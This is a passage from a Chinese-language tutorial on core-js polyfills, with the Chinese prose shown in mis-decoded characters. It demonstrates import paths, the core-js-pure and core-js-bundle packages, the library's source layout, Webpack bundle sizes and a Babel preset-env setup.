<p>ç„¶åå†çœ‹ä¸‹ç›´æ¥å¼•å…¥å¯¹è±¡ä¸­çš„æŸä¸ªæ–¹æ³•ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-built_in">require</span>(<span class="hljs-string">'core-js/full/promise/try'</span>)
<span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">try</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'jzplp!'</span>)
})

<span class="hljs-comment">/* è¾“å‡ºç»“æœ
jzplp!
*/</span>
</code></pre>
<h3 data-id="heading-4">ä¸æ³¨å…¥å…¨å±€å¯¹è±¡</h3>
<p>å‰é¢å±•ç¤ºçš„åœºæ™¯ï¼Œcore-jséƒ½æ˜¯å°†APIç›´æ¥æ³¨å…¥åˆ°å…¨å±€ï¼Œè¿™æ ·ä½¿ç”¨è¿™äº›APIå°±å¦‚ç¯å¢ƒæœ¬èº«æ”¯æŒä¸€æ ·ï¼ŒåŸºæœ¬æ„Ÿå—ä¸åˆ°åŒºåˆ«ã€‚ä½†å¦‚æœæˆ‘ä»¬ä¸å¸Œæœ›ç›´æ¥æ³¨å…¥åˆ°å…¨å±€æ—¶ï¼Œcore-jsä¹Ÿæä¾›äº†ä½¿ç”¨æ–¹å¼ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> promise = <span class="hljs-built_in">require</span>(<span class="hljs-string">'core-js-pure/full/promise'</span>);
promise.<span class="hljs-title function_">try</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'jzplp!'</span>)
})
<span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">try</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'jzplp!2'</span>)
})
<span class="hljs-comment">/* è¾“å‡ºç»“æœ
jzplp!
Promise.try(() =&gt; {
           ^
TypeError: Promise.try is not a function
*/</span>
</code></pre>
<p>å¯ä»¥çœ‹åˆ°ï¼Œä½¿ç”¨core-js-pureè¿™ä¸ªåŒ…ä¹‹åï¼Œå¯ä»¥ç›´æ¥å¯¼å‡ºæˆ‘ä»¬å¸Œæœ›è¦çš„APIï¼Œè€Œä¸ç›´æ¥æ³¨å…¥åˆ°å…¨å±€ã€‚æ­¤æ—¶ç›´æ¥ä½¿ç”¨å…¨å±€å¯¹è±¡æ–¹æ³•ä¾ç„¶æŠ¥é”™ã€‚è€Œcore-jsè¿™ä¸ªåŒ…è™½ç„¶ä¹Ÿèƒ½å¯¼å‡ºï¼Œä½†å®ƒè¿˜æ˜¯ä¼šç›´æ¥æ³¨å…¥å…¨å±€ï¼Œæˆ‘ä»¬çœ‹ä¸‹ä¾‹å­ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> promise = <span class="hljs-built_in">require</span>(<span class="hljs-string">'core-js/full/promise'</span>);
promise.<span class="hljs-title function_">try</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'jzplp!'</span>)
})
<span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">try</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'jzplp!2'</span>)
})

<span class="hljs-comment">/* è¾“å‡ºç»“æœ
jzplp!
jzplp!2
*/</span>
</code></pre>
<p>å› æ­¤ï¼Œå¦‚æœå¸Œæœ›ä»…ä½¿ç”¨å¯¼å‡ºå¯¹è±¡ï¼Œè¿˜æ˜¯éœ€è¦ä½¿ç”¨core-js-pureè¿™ä¸ªåŒ…ã€‚core-js-pureä¹Ÿå¯ä»¥ä»…å¯¼å‡ºå¯¹è±¡æ–¹æ³•ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> try2 = <span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js-pure/full/promise/try"</span>);
<span class="hljs-title class_">Promise</span>.<span class="hljs-property">try</span> = try2;
<span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">try</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"jzplp!"</span>);
});

<span class="hljs-comment">/* è¾“å‡ºç»“æœ
jzplp!
*/</span>
</code></pre>
<p>å› ä¸ºå¯¼å‡ºçš„å¯¹è±¡æ–¹æ³•ä¸èƒ½ç‹¬ç«‹ä½¿ç”¨ï¼Œå› æ­¤åœ¨ä¾‹å­ä¸­æˆ‘ä»¬è¿˜æ˜¯å°†å…¶æ³¨å…¥åˆ°Promiseå¯¹è±¡åä½¿ç”¨ã€‚</p>
<h3 data-id="heading-5">ç‰¹æ€§åˆ†ç±»å¼•å…¥</h3>
<p>core-jsä¸­åŒ…å«éå¸¸å¤šAPIç‰¹æ€§çš„å…¼å®¹ä»£ç ï¼Œæœ‰äº›æ˜¯å·²ç»ç¨³å®šçš„ç‰¹æ€§ï¼Œæœ‰äº›æ˜¯è¿˜å¤„åœ¨æè®®é˜¶æ®µçš„ï¼Œä¸ç¨³å®šçš„ç‰¹æ€§ã€‚æˆ‘ä»¬ç›´æ¥å¼•å…¥core-jsä¼šæŠŠè¿™äº›ç‰¹æ€§å…¨éƒ¨å¼•å…¥ï¼Œä½†å¦‚æœä¸éœ€è¦é‚£äº›ä¸ç¨³å®šç‰¹æ€§ï¼Œcore-jsä¹Ÿæä¾›äº†å¤šç§å¼•å…¥æ–¹å¼ï¼š</p>
<ul>
<li>core-js å¼•å…¥æ‰€æœ‰ç‰¹æ€§ï¼ŒåŒ…æ‹¬æ—©æœŸçš„æè®®</li>
<li>core-js/full ç­‰äºå¼•å…¥core-js</li>
<li>core-js/actual åŒ…å«ç¨³å®šçš„ESå’ŒWebæ ‡å‡†ç‰¹æ€§ï¼Œä»¥åŠstage3çš„ç‰¹æ€§</li>
<li>core-js/stable åŒ…å«ç¨³å®šçš„ESå’ŒWebæ ‡å‡†ç‰¹æ€§</li>
<li>core-js/es åŒ…å«ç¨³å®šçš„ESç‰¹æ€§</li>
</ul>
<p>è¿™é‡Œæˆ‘ä»¬ä¸¾ä¸¤ä¸ªä¾‹å­å°è¯•ä¸‹ã€‚é¦–å…ˆç”±äºECMAScriptæ ‡å‡†ä¸€ç›´åœ¨æ›´æ–°ä¸­ï¼Œæœ‰äº›ç‰¹æ€§ç°åœ¨æ˜¯æè®®ï¼Œæœªæ¥å¯èƒ½å°±å·²ç»è¢«åˆ—å…¥æ­£å¼ç‰¹æ€§äº†ã€‚å› æ­¤è¿™é‡Œçš„ä¾‹å­éœ€è¦æ˜ç¡®ç¯å¢ƒå’Œcore-jsç‰ˆæœ¬ã€‚è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨Node.js v18.19.1å’Œcore-js@3.47.0ç‰ˆæœ¬ï¼Œä»¥å†™è¿™ç¯‡æ–‡ç« çš„æ—¶é—´ä¸ºå‡†ã€‚</p>
<p>é¦–å…ˆç¬¬ä¸€ä¸ªç‰¹æ€§æ˜¯ï¼šæ•°ç»„çš„lastIndexå±æ€§ï¼Œè¿™æ˜¯ä¸€ä¸ªstage1é˜¶æ®µçš„APIï¼Œè¿™é‡Œé’ˆå¯¹ä¸åŒçš„å¼•å…¥æ–¹å¼è¿›è¡Œå°è¯•ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// ä¸å¼•å…¥core-jså°è¯•</span>
<span class="hljs-keyword">const</span> arr = [<span class="hljs-string">"jz"</span>, <span class="hljs-string">"plp"</span>];
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr.<span class="hljs-property">lastIndex</span>);
<span class="hljs-comment">/* è¾“å‡ºç»“æœ
undefined
*/</span>

<span class="hljs-comment">// å¼•å…¥core-js/full</span>
<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/full"</span>);
<span class="hljs-keyword">const</span> arr = [<span class="hljs-string">"jz"</span>, <span class="hljs-string">"plp"</span>];
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr.<span class="hljs-property">lastIndex</span>);
<span class="hljs-comment">/* è¾“å‡ºç»“æœ
1
*/</span>

<span class="hljs-comment">// å¼•å…¥core-js/actual</span>
<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/actual"</span>);
<span class="hljs-keyword">const</span> arr = [<span class="hljs-string">"jz"</span>, <span class="hljs-string">"plp"</span>];
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr.<span class="hljs-property">lastIndex</span>);

<span class="hljs-comment">/* è¾“å‡ºç»“æœ
undefined
*/</span>
</code></pre>
<p>é¦–å…ˆå½“ä¸å¼•å…¥core-jsæ—¶ï¼Œå› ä¸ºä¸æ”¯æŒè¿™ä¸ªAPIï¼Œæ‰€ä»¥è¾“å‡ºundefinedã€‚core-js/fullæ”¯æŒstage1é˜¶æ®µçš„APIï¼Œå¯ä»¥æ­£ç¡®è¾“å‡ºç»“æœã€‚ä½†core-js/actualä»…æ”¯æŒstage3é˜¶æ®µçš„APIï¼Œå› æ­¤è¿˜æ˜¯ä¸æ”¯æŒè¿™ä¸ªAPIã€‚</p>
<p>ç„¶åæˆ‘ä»¬å†çœ‹ä¸‹å¦å¤–ä¸€ä¸ªAPIï¼Œæ•°ç»„çš„groupByæ–¹æ³•ã€‚è¿™æ˜¯ä¸€ä¸ªstage3é˜¶æ®µçš„APIï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// ä¸å¼•å…¥core-jså°è¯•</span>
<span class="hljs-keyword">const</span> arr = [
  { <span class="hljs-attr">group</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">value</span>: <span class="hljs-string">"jz"</span> },
  { <span class="hljs-attr">group</span>: <span class="hljs-number">2</span>, <span class="hljs-attr">value</span>: <span class="hljs-string">"jz2"</span> },
  { <span class="hljs-attr">group</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">value</span>: <span class="hljs-string">"plp"</span> },
];
<span class="hljs-keyword">const</span> arrNew = arr.<span class="hljs-title function_">groupBy</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> item.<span class="hljs-property">group</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arrNew)
<span class="hljs-comment">/* è¾“å‡ºç»“æœ
const arrNew = arr.groupBy(item =&gt; item.group);
                   ^
TypeError: arr.groupBy is not a function
*/</span>

<span class="hljs-comment">// å¼•å…¥core-js/actual</span>
<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/actual"</span>);
<span class="hljs-keyword">const</span> arr = [
  { <span class="hljs-attr">group</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">value</span>: <span class="hljs-string">"jz"</span> },
  { <span class="hljs-attr">group</span>: <span class="hljs-number">2</span>, <span class="hljs-attr">value</span>: <span class="hljs-string">"jz2"</span> },
  { <span class="hljs-attr">group</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">value</span>: <span class="hljs-string">"plp"</span> },
];
<span class="hljs-keyword">const</span> arrNew = arr.<span class="hljs-title function_">groupBy</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> item.<span class="hljs-property">group</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arrNew)
<span class="hljs-comment">/* è¾“å‡ºç»“æœ
[Object: null prototype] {
  '1': [ { group: 1, value: 'jz' }, { group: 1, value: 'plp' } ],
  '2': [ { group: 2, value: 'jz2' } ]
}
*/</span>

<span class="hljs-comment">// å¼•å…¥core-js/stable</span>
<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/stable"</span>);
<span class="hljs-keyword">const</span> arr = [
  { <span class="hljs-attr">group</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">value</span>: <span class="hljs-string">"jz"</span> },
  { <span class="hljs-attr">group</span>: <span class="hljs-number">2</span>, <span class="hljs-attr">value</span>: <span class="hljs-string">"jz2"</span> },
  { <span class="hljs-attr">group</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">value</span>: <span class="hljs-string">"plp"</span> },
];
<span class="hljs-keyword">const</span> arrNew = arr.<span class="hljs-title function_">groupBy</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> item.<span class="hljs-property">group</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arrNew)
<span class="hljs-comment">/* è¾“å‡ºç»“æœ
const arrNew = arr.groupBy(item =&gt; item.group);
                   ^
TypeError: arr.groupBy is not a function
*/</span>
</code></pre>
<p>å¯ä»¥çœ‹åˆ°ï¼Œä¸å¼•å…¥core-jsæ—¶ä¸æ”¯æŒï¼Œå¼•å…¥äº†core-js/actualï¼ˆåŒ…å«stage3é˜¶æ®µçš„APIï¼‰åæ”¯æŒå¹¶èƒ½è¾“å‡ºæ­£ç¡®çš„ç»“æœã€‚core-js/stableä¸­ä¸æ”¯æŒåˆæŠ¥é”™äº†ã€‚</p>
<h2 data-id="heading-6">core-jsæºç ç»“æ„</h2>
<p>å‰é¢æè¿°äº†å¾ˆå¤šcore-jsçš„å¼•å…¥æ–¹å¼ï¼Œè¿™é‡Œæˆ‘ä»¬çœ‹ä¸€ä¸‹æºç ç»“æ„ï¼Œçœ‹çœ‹core-jså†…éƒ¨æ˜¯å¦‚ä½•ç»„ç»‡çš„ã€‚</p>
<h3 data-id="heading-7">core-jsæºç ç›®å½•</h3>
<pre><code class="hljs language-erlang" lang="erlang">core-js
â”œâ”€actual
â”‚   â”œâ”€array
â”‚   â”‚  â”œâ”€at.js
â”‚   â”‚  â”œâ”€concat.js
â”‚   â”‚  â””â”€...
â”‚   â”œâ”€set
â”‚   â”‚  â””â”€...
â”‚   â””â”€...
â”œâ”€es
â”‚   â””â”€...
â”œâ”€features
â”‚   â””â”€...
â”œâ”€index.js
â””â”€...
</code></pre>
<p>é¦–å…ˆåˆ—å‡ºcore-jsæºç ç›®å½•çš„ç¤ºæ„å›¾ï¼Œå¯ä»¥çœ‹åˆ°core-jså†…éƒ¨æœ‰å¾ˆå¤šç›®å½•ï¼Œå¯¹åº”å‰é¢çš„å„ç§å¼•å…¥æ–¹å¼ã€‚è¿™é‡Œæˆ‘ä»¬åˆ—å‡ºæ¯ä¸ªç›®å½•çš„å†…å®¹ï¼š</p>
<ul>
<li>actual åŒ…å«ç¨³å®šçš„ESå’ŒWebæ ‡å‡†ç‰¹æ€§ï¼Œä»¥åŠstage3çš„ç‰¹æ€§</li>
<li>es åŒ…å«ç¨³å®šçš„ESç‰¹æ€§</li>
<li>features æ²¡æœ‰è¯´æ˜ï¼ŒçŒœæµ‹å’Œfullç±»ä¼¼</li>
<li>full æ‰€ä»¥ç‰¹æ€§åŒ…æ‹¬æ—©æœŸæè®®</li>
<li>internals åŒ…å†…éƒ¨ä½¿ç”¨çš„é€»è¾‘</li>
<li>modules å®é™…ç‰¹æ€§çš„ä»£ç å®ç°</li>
<li>proposals åŒ…å«æè®®çš„ç‰¹æ€§</li>
<li>stable åŒ…å«ç¨³å®šçš„ESå’ŒWebæ ‡å‡†ç‰¹æ€§</li>
<li>stage æŒ‰ç…§stageé˜¶æ®µåˆ—å‡ºæè®®ç‰¹æ€§</li>
<li>web åŒ…å«Webæ ‡å‡†ç‰¹æ€§</li>
<li>configurator.js æ˜¯å¦å¼ºåˆ¶å¼•å…¥é€»è¾‘ï¼Œåé¢ä¼šæè¿°</li>
<li>index.js å†…å®¹ä¸ºå¯¼å‡ºfullç›®å½•ï¼Œå› æ­¤å¯¼å…¥core-jsç­‰äºå¯¼å…¥core-js/full</li>
</ul>
<h3 data-id="heading-8">å±‚å±‚å¼•ç”¨</h3>
<p>åœ¨ç›®å½•ä¸­actual, es, full, stable, esæ˜¯æˆ‘ä»¬å·²ç»ä»‹ç»è¿‡çš„ã€‚å¦å¤–è¿˜æœ‰webç›®å½•ä»…åŒ…å«webæ ‡å‡†çš„ç‰¹æ€§ï¼Œfeatureså’Œfullç±»ä¼¼ï¼ˆindex.jsä¸­ç›´æ¥å¯¼å‡ºfullç›®å½•ï¼‰ã€‚</p>
<p>proposalsç›®å½•åŒ…å«æè®®çš„ç‰¹æ€§ï¼Œä»¥ç‰¹æ€§åæ¥å‘½åæ–‡ä»¶åã€‚è€Œstageç›®å½•ä¸­åŒ…å«0.js, 1.js, 2.jsç­‰ç­‰ï¼Œæ˜¯æ ¹æ®stageé˜¶æ®µæ¥æ•´ç†çš„ï¼Œæ–¹ä¾¿æ•´ç†å’Œå¼•å…¥å¯¹åº”é˜¶æ®µçš„ç‰¹æ€§ã€‚</p>
<p>è¿™æ ·æ•´ç†ç›®å½•è™½ç„¶æ¸…æ™°ï¼Œä½†è¿™äº›ç›®å½•ä¸­çš„ç‰¹æ€§éƒ½æ˜¯é‡å¤çš„ï¼Œä¸å¯èƒ½åœ¨æ¯ä¸ªç›®å½•ä¸­æŠŠç‰¹æ€§éƒ½å®ç°ä¸€éã€‚å› æ­¤ä¸Šé¢è¿™äº›ç›®å½•çš„æ–‡ä»¶ä¸­ï¼Œå­˜æ”¾çš„éƒ½æ˜¯å®ç°çš„å¼•ç”¨ï¼Œå¹¶ä¸æ˜¯ç‰¹æ€§ä»£ç å®ç°æœ¬èº«ã€‚çœŸæ­£çš„å®ç°åœ¨modulesç›®å½•ä¸­ã€‚modulesç›®å½•ä¸­æ˜¯ä»¥ç‰¹æ€§åä½œä¸ºå‘½åçš„æ–‡ä»¶ï¼Œæ–‡ä»¶æœ‰å›ºå®šçš„å‰ç¼€åï¼šes.è¡¨ç¤ºESæ ‡å‡†ï¼›esnext.è¡¨ç¤ºæè®®ä¸­çš„æ ‡å‡†ï¼›web.è¡¨ç¤ºwebæ ‡å‡†ã€‚</p>
<p>è¿™é‡Œä»¥æˆ‘ä»¬ä¸Šé¢æåˆ°è¿‡çš„ä¸¤ä¸ªç‰¹æ€§ä¸ºä¾‹ï¼Œçœ‹çœ‹å¼•ç”¨è·¯å¾„ï¼Œé¦–å…ˆæ˜¯Promise.tryï¼š</p>
<ul>
<li>ä½¿ç”¨è€…å¼•å…¥ core-js/full/promise/try.js</li>
<li>å¼•å…¥ actual/promise/try.js</li>
<li>å¼•å…¥ actual/promise/try.js</li>
<li>å¼•å…¥ stable/promise/try.js</li>
<li>å¼•å…¥ es/promise/try.js</li>
<li>æœ€ç»ˆå¼•å…¥ modules/es.promise.try.js</li>
</ul>
<p>ç„¶åæ˜¯groupByæ–¹æ³•ï¼š</p>
<ul>
<li>ä½¿ç”¨è€…å¼•å…¥ core-js/actual/array/group-by.js</li>
<li>æœ€ç»ˆå¼•å…¥ modules/esnext.array.group-by.js</li>
</ul>
<p>å¯ä»¥çœ‹åˆ°ï¼Œcore-jså†…éƒ¨çš„ç‰¹æ€§æ˜¯ç»è¿‡å±‚å±‚å¼•å…¥ï¼Œæœ€ç»ˆå¼•å…¥å…·ä½“çš„å®ç°ä»£ç çš„ã€‚</p>
<h3 data-id="heading-9">core-js-pureä¸core-js-bundle</h3>
<p>é™¤äº†core-jsä¹‹å¤–ï¼Œcore-js-pureä¸core-js-bundleè¿™ä¸¤ä¸ªåŒ…ä¹Ÿæä¾›äº†å…¼å®¹æ€§ã€‚core-js-pureå†…éƒ¨çš„ç›®å½•ç»“æ„ä¸core-jsä¸€è‡´ï¼Œåªä¸è¿‡core-js-pureä¸å°†ç‰¹æ€§æ³¨å…¥åˆ°å…¨å±€ã€‚core-js-bundleæ¯”è¾ƒç‰¹æ®Šï¼Œå®ƒæ˜¯å°†core-jsä»£ç ç»è¿‡æ‰“åŒ…åå†æä¾›ï¼Œå®ƒçš„ç»“æ„å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino">core-js-bundle
â”œâ”€index.js
â”œâ”€minified.js
â”œâ”€minified.js.map
â””â”€...
</code></pre>
<p>å…¶ä¸­index.jsæ˜¯æ‰“åŒ…è¿‡åçš„ç‰¹æ€§é›†åˆä»£ç ï¼Œminified.jsæ˜¯ç»è¿‡å‹ç¼©æ··æ·†åçš„ä»£ç ã€‚core-js-bundleåªèƒ½å…¨éƒ¨å¼•å…¥å¹¶æ³¨å…¥åˆ°å…¨å±€ï¼Œä¸èƒ½å¼•å…¥éƒ¨åˆ†ç›®å½•æˆ–è€…å¯¼å‡ºæŸä¸ªå±æ€§ã€‚</p>
<h2 data-id="heading-10">æ‰“åŒ…å’Œæµè§ˆå™¨æ•ˆæœ</h2>
<h3 data-id="heading-11">åˆ›å»ºWebpackç¤ºä¾‹</h3>
<p>é¦–å…ˆåˆ›å»ºä¸€ä¸ªWebapcké¡¹ç›®ï¼Œæ–¹ä¾¿åç»­æ‰“åŒ…æŸ¥çœ‹æ•ˆæœã€‚é¦–å…ˆæ‰§è¡Œï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># åˆ›å»ºé¡¹ç›®</span>
npm init -y
<span class="hljs-comment"># å®‰è£…webpackä¾èµ–</span>
npm add webpack webpack-cli html-webpack-plugin
<span class="hljs-comment"># å®‰è£…core-jsä¾èµ–</span>
npm add core-js core-js-pure core-js-bundle
</code></pre>
<p>åˆ›å»ºsrc/index.jsï¼Œå†…å®¹å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> arr = [<span class="hljs-string">"jz"</span>, <span class="hljs-string">"plp"</span>];
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr.<span class="hljs-property">lastIndex</span>);
</code></pre>
<p>åœ¨package.jsonæ–‡ä»¶çš„scriptsä¸­å¢åŠ å‘½ä»¤ï¼š"build": "webpack"ã€‚æœ€åæ˜¯Webpacké…ç½®æ–‡ä»¶webpack.config.js:</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">'path'</span>);
<span class="hljs-keyword">const</span> <span class="hljs-title class_">HtmlWebpackPlugin</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">'html-webpack-plugin'</span>);

<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = {
  <span class="hljs-attr">mode</span>: <span class="hljs-string">'production'</span>, <span class="hljs-comment">// ç”Ÿäº§æ¨¡å¼</span>
  <span class="hljs-attr">entry</span>: <span class="hljs-string">'./src/index.js'</span>, <span class="hljs-comment">// æºç å…¥å£</span>
  <span class="hljs-attr">plugins</span>: [
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">HtmlWebpackPlugin</span>({ <span class="hljs-comment">// ç”ŸæˆHTMLé¡µé¢å…¥å£</span>
      <span class="hljs-attr">title</span>: <span class="hljs-string">'jzplpçš„core-jså®éªŒ'</span>, <span class="hljs-comment">// é¡µé¢æ ‡é¢˜</span>
    }),
  ],
  <span class="hljs-attr">output</span>: {
    <span class="hljs-attr">filename</span>: <span class="hljs-string">'main.js'</span>, <span class="hljs-comment">// ç”Ÿæˆæ–‡ä»¶å</span>
    <span class="hljs-attr">path</span>: path.<span class="hljs-title function_">resolve</span>(__dirname, <span class="hljs-string">'dist'</span>),  <span class="hljs-comment">// ç”Ÿæˆæ–‡ä»¶ç›®å½•</span>
    <span class="hljs-attr">clean</span>: <span class="hljs-literal">true</span>, <span class="hljs-comment">// ç”Ÿæˆå‰åˆ é™¤distç›®å½•å†…å®¹</span>
  },
};
</code></pre>
<p>å‘½ä»¤è¡Œè¿è¡Œnpm run buildï¼Œå³å¯ä½¿ç”¨Webpackæ‰“åŒ…ã€‚åœ¨distç›®å½•ä¸­ç”Ÿæˆäº†ä¸¤ä¸ªæ–‡ä»¶ï¼Œä¸€ä¸ªæ˜¯main.jsï¼Œé‡Œé¢æ˜¯æ‰“åŒ…åçš„jsä»£ç ï¼›index.htmlå¯ä»¥è®©æˆ‘ä»¬åœ¨æµè§ˆå™¨æŸ¥çœ‹æ•ˆæœã€‚ç”±äºæˆ‘ä»¬æ²¡æœ‰å¼•å…¥core-jsï¼Œæµè§ˆå™¨æ²¡æœ‰é¢„ç½®lastIndexè¿™ä¸ªæè®®ä¸­çš„ç‰¹æ€§ï¼Œå› æ­¤è¾“å‡ºundefinedã€‚</p>
<h3 data-id="heading-12">core-jsæ‰“åŒ…</h3>
<p>è¿™é‡Œå¼•å…¥core-jsï¼Œç„¶åæ‰“åŒ…æŸ¥çœ‹æ•ˆæœã€‚é¦–å…ˆæ˜¯å…¨é‡å¼•å…¥ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js"</span>);
<span class="hljs-keyword">const</span> arr = [<span class="hljs-string">"jz"</span>, <span class="hljs-string">"plp"</span>];
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr.<span class="hljs-property">lastIndex</span>);
</code></pre>
<p>æ­¤æ—¶æµè§ˆå™¨è¾“å‡º1ï¼Œè¡¨ç¤ºcore-jsæ³¨å…¥æˆåŠŸï¼ŒlastIndexç‰¹æ€§ç”Ÿæ•ˆäº†ã€‚ä½†æ˜¯æˆ‘ä»¬æŸ¥çœ‹main.jsï¼Œå‘ç°å±…ç„¶æœ‰267KBã€‚è¿™æ˜¯å› ä¸ºå®ƒæŠŠæ‰€æœ‰ç‰¹æ€§éƒ½å¼•å…¥äº†ã€‚</p>
<p>å¦‚æœå¼•å…¥<code>require("core-js/full/array")</code>ï¼Œæ­¤æ—¶æ–°ç‰¹æ€§ä¹Ÿå¯ä»¥ç”Ÿæ•ˆã€‚å› ä¸ºåªå¼•å…¥äº†æ•°ç»„ç›¸å…³ç‰¹æ€§ï¼Œå› æ­¤main.jsçš„å¤§å°ä¸º59.3KBï¼Œæ¯”å…¨é‡å¼•å…¥å°å¾ˆå¤šã€‚</p>
<p>å¦‚æœå¼•å…¥<code>require("core-js/full/array/last-index")</code>ï¼Œæ­¤æ—¶æ–°ç‰¹æ€§ä¹Ÿå¯ä»¥ç”Ÿæ•ˆã€‚å› ä¸ºåªå¼•å…¥äº†è¿™ä¸€ä¸ªç‰¹æ€§ï¼Œå› æ­¤main.jsçš„å¤§å°ä¸º12.2KBã€‚</p>
<h2 data-id="heading-13">Babelä¸core-js</h2>
<p>ä»å‰é¢æ‰“åŒ…çš„ä¾‹å­ä¸­å¯ä»¥çœ‹åˆ°ï¼Œcore-jsæ•´ä¸ªæ‰“åŒ…è¿›é¡¹ç›®ä¸­æ˜¯éå¸¸å·¨å¤§çš„ï¼Œå¯èƒ½æ¯”ä½ æ­£å¸¸é¡¹ç›®çš„å¤§å°è¿˜è¦æ›´å¤§ã€‚è¿™æ ·æ˜æ˜¾ä¼šé€ æˆå ç”¨èµ„æºæ›´å¤šï¼Œé¡µé¢åŠ è½½æ—¶é—´å˜æ…¢ç­‰é—®é¢˜ã€‚ä¸€ä¸ªè§£å†³åŠæ³•æ˜¯ï¼Œåªå¼•å…¥æˆ‘ä»¬ä»£ç ä¸­ä½¿ç”¨åˆ°çš„ç‰¹æ€§ï¼Œä»¥åŠæˆ‘ä»¬è¦é€‚é…çš„æµè§ˆå™¨ç‰ˆæœ¬ä¸­ä¸å…¼å®¹çš„ç‰¹æ€§ï¼Œç”¨ä¸åˆ°çš„ç‰¹æ€§ä¸æ‰“åŒ…è¿›ä»£ç ä¸­ã€‚Babelå°±æä¾›äº†è¿™æ ·çš„åŠŸèƒ½ã€‚</p>
<h3 data-id="heading-14">åˆ›å»ºBabelç¤ºä¾‹</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># åˆ›å»ºé¡¹ç›®</span>
npm init -y
<span class="hljs-comment"># å®‰è£…webpackä¾èµ–</span>
npm add @babel/core @babel/cli @babel/preset-env
<span class="hljs-comment"># å®‰è£…core-jsä¾èµ–</span>
npm add core-js core-js-pure core-js-bundle
</code></pre>
<p>åˆ›å»ºsrc/index.jsï¼Œå†…å®¹å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-built_in">require</span>(<span class="hljs-string">'core-js'</span>);
<span class="hljs-keyword">const</span> jzplp = <span class="hljs-number">1</span>;
</code></pre>
<p>åœ¨package.jsonæ–‡ä»¶çš„scriptsä¸­å¢åŠ å‘½ä»¤ï¼š"babel": "babel src --out-dir lib"ã€‚æœ€åæ˜¯Babelé…ç½®æ–‡ä»¶babel.config.json:</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"presets"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
    <span class="hljs-punctuation">[</span>
      <span class="hljs-string">"@babel/preset-env"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"targets"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
          <span class="hljs-attr">"chrome"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"100"</span>
        <span class="hljs-punctuation">}</span>
      <span class="hljs-punctuation">}</span>
    <span class="hljs-punctuation">]</span>
  <span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>targetsä¸­è¡¨ç¤ºæˆ‘ä»¬éœ€è¦å…¼å®¹çš„æµè§ˆå™¨ç‰ˆæœ¬ã€‚æ‰§è¡Œnpm run babelï¼Œç”Ÿæˆç»“æœå†lib/index.jsä¸­ï¼Œå†…å®¹å¦‚ä¸‹ã€‚å¯ä»¥çœ‹åˆ°æœªå¯¹core-jsåšä»»ä½•å¤„ç†ã€‚</p>
